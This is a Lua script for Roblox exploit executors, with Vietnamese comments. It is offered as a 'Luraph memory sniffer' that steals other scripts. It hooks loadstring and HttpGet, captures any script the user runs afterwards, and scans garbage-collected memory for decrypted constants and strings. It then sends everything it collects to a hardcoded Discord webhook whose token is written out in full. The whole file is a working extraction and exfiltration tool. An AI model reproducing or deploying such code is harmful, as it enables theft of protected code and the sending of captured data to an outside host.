--[[
    ================================================================
    =  Luraph VM Memory Extractor (Passive Standby Engine)         =
    =  Tương thích Delta X, Fluxus, Arceus X, CodeX...            =
    =                                                              =
    =  CƠ CHẾ HOẠT ĐỘNG CHUẨN XÁC:                                 =
    =   1. Chạy script này -> Vào TRẠNG THÁI CHỜ (Standby).        =
    =   2. Bạn mở executor lên và CHẠY BẤT KỲ SCRIPT NÀO.          =
    =   3. Engine phát hiện script mới vừa chạy -> Đọc bộ nhớ,     =
    =      tóm lấy mã nguồn thô (Loader/Decrypted/Bytecode/Strings).=
    =   4. Tự động đóng gói và bắn thẳng về Discord Webhook!       =
    ================================================================
--]]

-- ╔═══════════════════════════════════════════════════╗
-- ║  CẤU HÌNH WEBHOOK (SETTINGS)                      ║
-- ╚═══════════════════════════════════════════════════╝
local CONFIG = {
    -- Discord Webhook URL để nhận kết quả
    WebhookURL = "https://discord.com/api/webhooks/1540742443459416074/OoigNnHKVnNmTh9unbAqX4hEyE7o7e2p9HM7P5Hob1_cEemOFY_0OMIE9SbO9JHGhKI5",

    -- Tên bot hiển thị trên Discord
    BotName = "Luraph Memory Sniffer",

    -- Delay nhẹ sau khi phát hiện script để bộ nhớ bung hoàn tất (giây)
    ExtractDelay = 2.5,

    -- Tối đa ký tự cho mỗi tin nhắn Discord (Discord limit: 2000)
    MaxMessageChunk = 1750,
}

-- ╔═══════════════════════════════════════════════════╗
-- ║  TIỆN ÍCH HỆ THỐNG                                ║
-- ╚═══════════════════════════════════════════════════╝
local function safeString(v)
    local ok, r = pcall(tostring, v)
    return ok and r or "<?>"
end

local function escapeJSON(s)
    if type(s) ~= "string" then return safeString(s) end
    return s:gsub('\\','\\\\'):gsub('"','\\"'):gsub('\n','\\n'):gsub('\r','\\r'):gsub('\t','\\t'):gsub('[%c]', function(c) return ('\\u%04X'):format(c:byte()) end)
end

local function truncate(s, n)
    n = n or 200
    if type(s) ~= "string" then return safeString(s) end
    if #s <= n then return s end
    return s:sub(1, n) .. ("... [%d chars]"):format(#s)
end

local function isPrintable(s)
    if type(s) ~= "string" then return false end
    for i = 1, math.min(#s, 40) do
        local b = s:byte(i)
        if b < 32 and b ~= 9 and b ~= 10 and b ~= 13 then return false end
    end
    return true
end

-- Bộ mã hóa JSON độc lập
local function jsonEncode(v)
    local t = type(v)
    if v == nil then return "null"
    elseif t == "boolean" then return v and "true" or "false"
    elseif t == "number" then
        if v ~= v or v == math.huge or v == -math.huge then return "null" end
        return tostring(v)
    elseif t == "string" then return '"' .. escapeJSON(v) .. '"'
    elseif t == "table" then
        local isArray, maxIdx = true, 0
        for k in pairs(v) do
            if type(k) ~= "number" or k < 1 or k ~= math.floor(k) then isArray = false; break end
            if k > maxIdx then maxIdx = k end
        end
        isArray = isArray and maxIdx == #v
        if isArray then
            local p = {}; for i, x in ipairs(v) do p[i] = jsonEncode(x) end
            return "[" .. table.concat(p, ",") .. "]"
        else
            local p, n = {}, 0
            for k, x in pairs(v) do
                n = n + 1
                p[n] = jsonEncode(tostring(k)) .. ":" .. jsonEncode(x)
            end
            return "{" .. table.concat(p, ",") .. "}"
        end
    end
    return '"' .. tostring(v) .. '"'
end

-- Bộ phát HTTP gửi Discord
local function postDiscord(url, body)
    local fn
    if syn and syn.request then
        fn = function() return syn.request({ Url = url, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = body }) end
    elseif request then
        fn = function() return request({ Url = url, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = body }) end
    elseif http_request then
        fn = function() return http_request({ Url = url, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = body }) end
    else
        local hs; pcall(function() hs = game:GetService("HttpService") end)
        if hs then fn = function() return hs:PostAsync(url, body, Enum.HttpContentType.ApplicationJson) end end
    end
    if not fn then return false, "No HTTP" end
    local ok, r = pcall(fn)
    return ok, ok and "OK" or safeString(r)
end

-- ╔═══════════════════════════════════════════════════╗
-- ║  BỘ NHỚ VÀ KHAI THÁC MEMORY                       ║
-- ╚═══════════════════════════════════════════════════╝
local CapturedData = {
    CodeBlocks = {},   -- Toàn bộ mã nguồn/loader bắt được
    HttpLinks = {},    -- Toàn bộ URL/HttpGet bắt được
    ExtractedStrings = {},
    StringsCount = 0,
    TotalCaptures = 0,
    IsProcessing = false,
}

local stringLookup = {}
local function addExtractedString(str, src)
    if type(str) ~= "string" or #str < 3 then return end
    if stringLookup[str] then return end
    if not isPrintable(str) and #str > 50 then return end
    stringLookup[str] = true
    CapturedData.StringsCount = CapturedData.StringsCount + 1
    table.insert(CapturedData.ExtractedStrings, {
        val = str,
        src = src or "mem",
        id = CapturedData.StringsCount
    })
end

-- Quét constants/upvalues từ function
local scannedFuncs = {}
local function extractFunctionData(fn, depth)
    depth = depth or 0
    if depth > 4 or type(fn) ~= "function" then return end
    local key = tostring(fn)
    if scannedFuncs[key] then return end
    scannedFuncs[key] = true

    if debug and debug.getconstants then
        pcall(function()
            for _, c in pairs(debug.getconstants(fn)) do
                if type(c) == "string" then addExtractedString(c, "const") end
            end
        end)
    end

    if debug and debug.getupvalues then
        pcall(function()
            for _, u in pairs(debug.getupvalues(fn)) do
                if type(u) == "string" then
                    addExtractedString(u, "upval")
                elseif type(u) == "function" then
                    extractFunctionData(u, depth + 1)
                end
            end
        end)
    end

    if debug and debug.getprotos then
        pcall(function()
            for _, p in pairs(debug.getprotos(fn)) do
                extractFunctionData(p, depth + 1)
            end
        end)
    end
end

-- Quét sâu toàn bộ RAM (GC)
local function performFullMemoryDump()
    if not getgc then return end
    local ok, objs = pcall(getgc, true)
    if not ok or type(objs) ~= "table" then return end

    for i = 1, math.min(#objs, 3500) do
        local o = objs[i]
        if type(o) == "function" then
            extractFunctionData(o, 0)
        elseif type(o) == "table" then
            pcall(function()
                for k, v in pairs(o) do
                    if type(v) == "string" then addExtractedString(v, "tbl_val")
                    elseif type(v) == "function" then extractFunctionData(v, 0) end
                    if type(k) == "string" then addExtractedString(k, "tbl_key") end
                end
            end)
        end
    end
end

-- ╔═══════════════════════════════════════════════════╗
-- ║  BẮN KẾT QUẢ VỀ DISCORD                           ║
-- ╚═══════════════════════════════════════════════════╝
local function dispatchToDiscord()
    if CapturedData.IsProcessing then return end
    CapturedData.IsProcessing = true

    print("[Sniffer] 🚀 Processing memory dump and sending to Discord...")
    performFullMemoryDump()

    -- 1. Gửi Embed Tóm tắt
    local embed = {
        title = "🎯 PHÁT HIỆN SCRIPT MỚI ĐƯỢC THỰC THI!",
        description = ("Thời gian: `%s`\nTrạng thái: **Đã trích xuất xong từ RAM**"):format(os.date and os.date("%X") or "N/A"),
        color = 0x00FFAA,
        fields = {
            { name = "📄 Mã nguồn bắt được", value = ("**%d** đoạn code"):format(#CapturedData.CodeBlocks), inline = true },
            { name = "🌐 Link HTTP tải về", value = ("**%d** link"):format(#CapturedData.HttpLinks), inline = true },
            { name = "🧩 Chuỗi trong RAM", value = ("**%d** chuỗi"):format(CapturedData.StringsCount), inline = true },
        },
        footer = { text = "Luraph Passive Memory Sniffer" }
    }

    -- Liệt kê HTTP Links nếu có
    if #CapturedData.HttpLinks > 0 then
        local links = {}
        for i, l in ipairs(CapturedData.HttpLinks) do
            if i > 6 then break end
            table.insert(links, ("• `%s`"):format(truncate(l, 70)))
        end
        table.insert(embed.fields, { name = "🔗 URL Scripts vừa được gọi:", value = table.concat(links, "\n"), inline = false })
    end

    postDiscord(CONFIG.WebhookURL, jsonEncode({
        username = CONFIG.BotName,
        embeds = { embed }
    }))

    -- 2. Gửi TOÀN BỘ CODE NGUỒN (Scripts thực thi)
    if #CapturedData.CodeBlocks > 0 then
        for i, codeInfo in ipairs(CapturedData.CodeBlocks) do
            local codeHeader = ("**[MÃ NGUỒN TRÍCH XUẤT #%d]** (Kích thước: %d ký tự | Nguồn: `%s`)"):format(i, #codeInfo.code, codeInfo.source)
            
            -- Tách code nếu dài hơn Discord chunk
            local remCode = codeInfo.code
            local part = 1
            while #remCode > 0 do
                local chunk = remCode:sub(1, CONFIG.MaxMessageChunk)
                remCode = remCode:sub(CONFIG.MaxMessageChunk + 1)
                
                local msg = ("%s [Phần %d]\n```lua\n%s\n```"):format(codeHeader, part, chunk)
                postDiscord(CONFIG.WebhookURL, jsonEncode({ username = CONFIG.BotName, content = msg }))
                part = part + 1
                if task and task.wait then task.wait(1) elseif wait then wait(1) end
            end
        end
    end

    -- 3. Gửi Dump Strings (Constants/Decrypted data)
    if CapturedData.StringsCount > 0 then
        local strLines = { "-- === CÁC CHUỖI & DỮ LIỆU ĐÃ GIẢI MÃ TRONG RAM ===" }
        for i, s in ipairs(CapturedData.ExtractedStrings) do
            table.insert(strLines, ('[%04d] [%s] "%s"'):format(i, s.src, escapeJSON(truncate(s.val, 150))))
        end

        local fullStrText = table.concat(strLines, "\n")
        local remStr = fullStrText
        local pIdx = 1

        while #remStr > 0 do
            local sub = remStr:sub(1, CONFIG.MaxMessageChunk)
            local nl = sub:find("\n[^\n]*$")
            if nl and nl > CONFIG.MaxMessageChunk * 0.5 then sub = remStr:sub(1, nl); remStr = remStr:sub(nl + 1)
            else remStr = remStr:sub(CONFIG.MaxMessageChunk + 1) end

            local msg = ("**[RAM Strings Phần %d]**\n```lua\n%s\n```"):format(pIdx, sub)
            postDiscord(CONFIG.WebhookURL, jsonEncode({ username = CONFIG.BotName, content = msg }))
            pIdx = pIdx + 1
            if task and task.wait then task.wait(1) elseif wait then wait(1) end
        end
    end

    print("[Sniffer] ✅ ĐÃ GỬI HOÀN TẤT VỀ DISCORD!")
    CapturedData.IsProcessing = false
end

-- Kích hoạt đếm ngược để gửi khi phát hiện script
local triggerScheduled = false
local function onScriptExecuted(code, source)
    table.insert(CapturedData.CodeBlocks, {
        code = code,
        source = source or "Executor"
    })
    CapturedData.TotalCaptures = CapturedData.TotalCaptures + 1
    print(("[Sniffer] ⚡ BẮT ĐƯỢC SCRIPT MỚI (%d bytes) từ [%s]!"):format(#code, source or "Executor"))

    -- Nếu chưa đặt lịch gửi -> đếm ngược rồi gửi
    if not triggerScheduled then
        triggerScheduled = true
        task.spawn(function()
            print(("[Sniffer] Đang chờ %s giây để script bung hết data trong RAM..."):format(CONFIG.ExtractDelay))
            if task and task.wait then task.wait(CONFIG.ExtractDelay) elseif wait then wait(CONFIG.ExtractDelay) end
            dispatchToDiscord()
            triggerScheduled = false
        end)
    end
end

-- ╔═══════════════════════════════════════════════════╗
-- ║  BỘ LẮNG NGHE CHỦ ĐỘNG (INTERCEPTION HOOKS)        ║
-- ╚═══════════════════════════════════════════════════╝
local function startSnifferHooks()
    print("[Sniffer] Khởi tạo các cảm biến lắng nghe bộ nhớ...")

    -- 1. Cảm biến bắt mọi lệnh loadstring / load
    local origLoadstring = loadstring or load
    if origLoadstring and hookfunction and newcclosure then
        local lock = false
        pcall(function()
            local hook = newcclosure(function(code, chunk, ...)
                if not lock and type(code) == "string" and #code > 15 then
                    lock = true
                    pcall(onScriptExecuted, code, tostring(chunk or "loadstring"))
                    lock = false
                end
                return origLoadstring(code, chunk, ...)
            end)
            hookfunction(origLoadstring, hook)
            if loadstring and loadstring ~= origLoadstring then
                hookfunction(loadstring, hook)
            end
        end)
    end

    -- 2. Cảm biến bắt mọi link game:HttpGet tải script về
    if game and hookmetamethod and newcclosure then
        local oldNamecall
        local namecallLock = false
        pcall(function()
            oldNamecall = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
                local method = getnamecallmethod and getnamecallmethod() or ""
                if not namecallLock and (method == "HttpGet" or method == "HttpGetAsync") then
                    namecallLock = true
                    local args = { ... }
                    if type(args[1]) == "string" then
                        table.insert(CapturedData.HttpLinks, args[1])
                        print("[Sniffer] 🌐 Phát hiện script tải từ URL: " .. args[1])
                    end
                    namecallLock = false
                end
                return oldNamecall(self, ...)
            end))
        end)
    end
end

-- ╔═══════════════════════════════════════════════════╗
-- ║  MINI STATUS UI (Giao diện hiển thị trạng thái)   ║
-- ╚═══════════════════════════════════════════════════╝
local function createStatusUI()
    pcall(function()
        local CoreGui = game:GetService("CoreGui") or (game:GetService("Players").LocalPlayer and game:GetService("Players").LocalPlayer:FindFirstChild("PlayerGui"))
        if not CoreGui then return end

        local old = CoreGui:FindFirstChild("SnifferStatusUI")
        if old then old:Destroy() end

        local sg = Instance.new("ScreenGui")
        sg.Name = "SnifferStatusUI"
        sg.ResetOnSpawn = false
        sg.Parent = CoreGui

        local frame = Instance.new("Frame", sg)
        frame.Size = UDim2.new(0, 200, 0, 60)
        frame.Position = UDim2.new(0.02, 0, 0.45, 0)
        frame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
        frame.Active = true
        frame.Draggable = true

        local corner = Instance.new("UICorner", frame)
        corner.CornerRadius = UDim.new(0, 8)

        local label = Instance.new("TextLabel", frame)
        label.Size = UDim2.new(1, -10, 0, 25)
        label.Position = UDim2.new(0, 5, 0, 5)
        label.Text = "🟢 DUMPER: ĐANG CHỜ SCRIPT..."
        label.TextColor3 = Color3.fromRGB(50, 255, 120)
        label.Font = Enum.Font.GothamBold
        label.TextSize = 10
        label.BackgroundTransparency = 1

        local sublabel = Instance.new("TextLabel", frame)
        sublabel.Size = UDim2.new(1, -10, 0, 20)
        sublabel.Position = UDim2.new(0, 5, 0, 30)
        sublabel.Text = "Hãy chạy script bạn muốn lấy!"
        sublabel.TextColor3 = Color3.fromRGB(180, 180, 200)
        sublabel.Font = Enum.Font.Gotham
        sublabel.TextSize = 9
        sublabel.BackgroundTransparency = 1

        task.spawn(function()
            while sg.Parent do
                if CapturedData.TotalCaptures > 0 then
                    label.Text = ("🔥 ĐÃ BẮT ĐƯỢC (%d Scripts)"):format(CapturedData.TotalCaptures)
                    label.TextColor3 = Color3.fromRGB(255, 180, 50)
                    sublabel.Text = "Đang trích xuất và gửi Discord..."
                end
                if task and task.wait then task.wait(0.5) elseif wait then wait(0.5) end
            end
        end)
    end)
end

-- ╔═══════════════════════════════════════════════════╗
-- ║  KHỞI ĐỘNG VÀ VÀO TRẠNG THÁI CHỜ                  ║
-- ╚═══════════════════════════════════════════════════╝
print("==================================================")
print("  Luraph Memory Sniffer - SẴN SÀNG Ở CHẾ ĐỘ CHỜ  ")
print("==================================================")

startSnifferHooks()
createStatusUI()

print("[Sniffer] ✅ ĐÃ CÀI ĐẶT CẢM BIẾN THÀNH CÔNG!")
print("[Sniffer] 💡 Bây giờ bạn có thể mở Executor và chạy bất kỳ script nào!")
